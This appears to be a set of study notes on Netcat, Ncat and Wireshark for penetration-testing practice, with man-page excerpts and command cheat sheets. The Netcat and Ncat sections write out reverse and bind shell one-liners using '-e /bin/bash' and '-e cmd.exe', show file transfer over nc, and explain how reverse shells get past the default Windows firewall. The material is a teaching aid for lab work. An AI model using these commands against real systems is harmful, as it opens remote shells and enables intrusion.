- **[Netcat](#netcat)**
- **[Ncat](#ncat)**
- **[Wireshark](#wireshark)**
- **[TCPdump](#tcpdump)**

## Netcat<a name="netcat"></a>

       netcat is a simple unix utility which reads and writes data across network
       connections, using TCP or UDP protocol. It  is  designed  to  be  a  reliable
       "back-end" tool that can be used directly or easily driven by other programs
       and scripts. At the same time, it is a feature-rich  network  debugging  and
       exploration tool, since it can create almost any kind of connection you would
       need and has several interesting built-in capabilities. Netcat, or  "nc"  as
       the  actual  program  is named, should have been supplied long ago as another
       one of those cryptic but standard Unix tools.

       In the simplest usage, "nc host port" creates a TCP connection to  the  given
       port on the given target host.  Your standard input is then sent to the host,
       and anything that comes back across the connection is sent to  your  standard
       output.   This  continues indefinitely, until the network side of the connec‐
       tion shuts down.  Note that this behavior is different from most other appli‐
       cations which shut everything down and exit after an end-of-file on the stan
       ‐dard input.

       Netcat can also function as a server, by listening for inbound connections on
       arbitrary ports and then doing the same reading and writing.  With minor lim‐
       itations, netcat doesn't really care if it runs in "client" or "server"  mode
       --  it  still shovels data back and forth until there isn't any more left. In
       either mode, shutdown can be forced after a configurable time  of  inactivity
       on the network side.

===

This part primarily deals with using netcat to create bind shells or reverse shells. I will let the examples speak for themselves. In this context shell stands for a command window that can be used to execute commands on. 

#### Windows Netcat Cmds:

````bash
>nc.exe -h #help for man page
>nc.exe -nvLp [port] #listens on port
>nc.exe -nv [ip] [port] #transmits data to ip and port
>nc.exe -nv [ip] [port] -e cmd.exe #sends reverse shell
````
#### Linux NetCat Cmds:
````bash
$ man nc #manual page for netcat
$ nc -nv [ip] [port] #transmits
$ nc -nvlp [port] #listens
$ nc -nv [ip] [port] -e /bin/bash #sends reverse shell
````

#### Reverse Shell: shell is *transmitted*.

examples:
```bash
winbox: >nc.exe -nvLp [port] #windows box listens on specified port.
linuxbox: $ nc -nv [ip] [port] -e /bin/bash #linux box transmits shell to windows box
winbox: gains shell on linux box
```

This flow can be reversed to transmit shell from a windows box or linux box.
Reverse shells are great for evading windows firewalls, since usually communications are blocked inwards but not outwards. 

#### Bind Shell: shell is *binded* to port during listen command.
examples:
```bash
linuxbox: $ nc -nvlp [port] -e /bin/bash
winbox: >nc.exe -nv [ip] [port] 
winbox: gains shell on linux box
```
Important to note now that the difference between reverse and bind shell. During listening phase in the flow, instead of just specifying a port to listen. It calls up the shell to be binded on that port. Any computer that then connects to the box on that port will gain a shell on the machine listening. Usually does not work when a firewall is present due to the need to receive connections.

#### Examples of Reverse Shells:

Kali -> Windows:

```bash
winbox: >nc.exe -nvLp [port] #windows listens on port
linuxbox: $ nc -nv [ip] [port] -e /bin/bash #transmits shell to windows box
```

Windows -> Kali:

```bash
linuxbox: $ nc -nvlp [port] #linux listens on port
winbox: >nc.exe -nv [ip] [port] -e cmd.exe  #transmits cmd to linux box
```
#### Examples of Bind Shells:

Kali -> Linux:
```bash
linuxbox: $ nc -nvlp [port] -e /bin/bash #linux listens and binds shell on port
winbox: >nc -nv [ip] [port] #connects to linux box with binded shell
```
Windows -> Linux:
```bash
winbox: >nc.exe -nvLp [port] -e cmd.exe #windows listens and binds cmd on port
linuxbox: $ nc -nv [ip] [port] #connects to windows box with binded cmd
```

#### Sending of Files Over NetCat:

Linux -> Windows:
```bash
winbox: >nc -nvLp [port] > incoming.exe #listens on port and sends data to executable
linuxbox: $ nc -nv [ip] [port] < outgoing #transmits data to windows box which fills
					#incoming.exe
```
Windows -> Linux:
```bash
linuxbox: $ nc -nvlp [port] > incoming #listens on port and sends data to executable
winbox: >nc -nv [ip] [port] < outgoing #transmits data to linux box which which fills
				      #incoming
```

#### Evading Windows Firewall:

Default Windows firewall settings pretty much negate any connections to the windows box. This handles most Bind Shell attacks or opening a port to listen. However, one thing that is interesting is the firewall in default configuration does not guard against the windows machine sending connections to foreign machines. This opens the firewall up to reverse shell attacks. 

## Ncat<a name="ncat"></a>

```sh
$ man ncat #description of command line tool.
```
       Ncat is a feature-packed networking utility which reads and writes data
       across networks from the command line. Ncat was written for the Nmap Project
       and is the culmination of the currently splintered family of Netcat
       incarnations. It is designed to be a reliable back-end tool to instantly
       provide network connectivity to other applications and users. Ncat will not
       only work with IPv4 and IPv6 but provides the user with a virtually limitless
       number of potential uses.

       Among Ncat's vast number of features there is the ability to chain Ncats
       together; redirection of TCP, UDP, and SCTP ports to other sites; SSL
       support; and proxy connections via SOCKS4 or HTTP proxies (with optional
       proxy authentication as well). Some general principles apply to most
       applications and thus give you the capability of instantly adding networking
       support to software that would normally never support it.


So far, ncat seems like a version of netcat that has support for additional functionality like SSL
so you can have a secure tunnel to transfer data over. If you dig deeper in the man pages (man ncat) you can find more information on this additional functionality. For the sake of not writing a small novel, we will move into some examples.

* ncat = linux
* ncat.exe = windows

The tacks are similar between the two environments:
* -v = verbose; (logging) good for confirming what ports you are listening on
* -l [port] = listen; sets ncat to listen on specified port range
* -e = execute; ex: /bin/bash for linux shell/cmd.exe for command prompt. once connected will execute.

* --allow [ip] [port] --ssl
allows only specified ip and port for use in secure socket layer communication.
secure the traffic over the wire.

The following are examples for use in establishing connection streams.

Encrypted reverse shell from Windows -> Kali:
(hint: remember reverse shell involves not executing during listening)

```sh
linux box: ncat -nvl [port] --allow [ip] [port] --ssl
win box: ncat.exe -e cmd.exe -vn 10.11.0.80 4444 --ssl
linux box: shell on windows box.
```

If the other box does not have SSL enabled when trying to connect with ncat, the connection will fail.

You can also create encrypted bind shells with ncat, you can also connect to ncat from netcat (they are pretty much the same thing.)

Encrypted bind shell on Windows <- Kali:

```sh
win box: ncat.exe -lvn 4444 --allow [ip] [port] --ssl -e cmd.exe
linux box: ncat -nv [ip] [port] --ssl
```
## Wireshark<a name="wireshark"></a>

       Wireshark is a GUI network protocol analyzer.  It lets you interactively browse packet data
       from a live network or from a previously saved capture file.  Wireshark's native capture file
       format is pcap format, which is also the format used by tcpdump and various other tools.

Wireshark is a packet analyzer with a view(GUI). The comparsion to TCPDump which I will discuss after this section. It is sometimes helpful to see how your box is communicating which the network or seeing what is talking on the network.

Since Wireshark is GUI based, it will take me alittle more to get some images up demonstrating a capture, but I plan to do this in the future. 

A key part of using Wireshark is carving out useful data from your overall capture, sometimes a quick capture can also bring with it all the background noise that you may not be particularly interested in seeing. Below I will post some of the key filters you can use to carve out the protocols you are looking at analyzing. Hint: These can be plugged into the input bar that is just under main button array on the top and flanked on the left by a little blue ribbon.

ip.addr == [ip] #sets filter for packets with ip address.
http #sets filter to http packets (this can be done for other protocols)
tcp contains [string] #sets filter to catch tcp packets that contain a specified string.
!http #sets filter for anything but http packets using the ! symbol.
http && dns #sets filter for packets that are using DNS or HTTP using && symbol.
tcp.ack #sets filter to catch TCP ACK packets; [protocol].[method] can be used for other protocols.

There are many other filters that can be applied to your particular capture to carve out the important information you need. I may expand on this section later or post some nice cheatsheets.

## TCPdump<a name="tcpdump></a>
